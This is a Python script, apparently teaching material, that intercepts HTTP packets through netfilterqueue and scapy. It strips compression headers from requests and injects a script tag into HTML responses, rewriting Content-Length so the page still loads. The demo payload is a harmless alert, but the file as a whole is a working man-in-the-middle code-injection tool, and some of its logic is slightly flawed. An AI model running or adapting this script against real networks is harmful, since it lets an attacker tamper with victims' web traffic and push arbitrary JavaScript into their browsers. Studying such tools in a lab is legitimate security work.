#!/usr/bin/env python3
# Rebuild - View README for testing parameters.
import netfilterqueue
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import Raw
import re

AcceptEncodingRegex = "Accept-Encoding:.*?\\r\\n"
replace_load = ""
# Content-Length non capturing group, return value, but not the key for the value.
ContentLengthRegex = "(?:Content-Length:\s)(\d*)"
injection_code = "<script>alert('Test!'); </script>"

# Take our modified load and set it to the packet load
def set_load(packet, load):
    packet[Raw].load = load
    # For scapy to recalculate IP and Chksum for updated load, delete them
    # Making the change from del, to *= None, does not affect the results
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return packet

def process_packet(packet):
    # convert the raw netfilter packet into a Scapy packet
    scapy_packet= IP(packet.get_payload())
    if scapy_packet.haslayer(Raw):
        # let's try and manage errors without crashing the script
        try:
            # grab the load from the HTTP Raw layer
            # .decode() we now wanna convert bytes object to string for python3
            load = scapy_packet[Raw].load.decode()

            # 1. HANDLE REQUESTS (Going to the Server)
            if scapy_packet.haslayer(TCP) and scapy_packet[TCP].dport == 80:
                print("[+] HTTP Request Intercepted:  ")
                # Strip encoding to prevent compression
                # Find "Accept-Encoding" in payload, replace with ""
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            # 2. HANDLE RESPONSES (Coming from the Server)
            elif scapy_packet.haslayer(TCP) and scapy_packet[TCP].sport == 80:
                print("[+] HTTP Response Intercepted:  ")
                # method replace string with another string
                load = load.replace("</body>", injection_code + "</body>")
                # Update Content-Length so the browser doesn't cut off the end of the page
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                # if value, and, check this is a html response, not an image etc
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

                # 3. APPLY CHANGES
                if load != scapy_packet[Raw].load:
                    new_packet = set_load(scapy_packet, load)
                    packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass

    # FORWARD the packet to its destination.
    packet.accept()


if __name__ == "__main__":
    try:
        print("[*] Initializing NetfilterQueue...")
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(3, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C detected. Unbinding queue and exiting...")

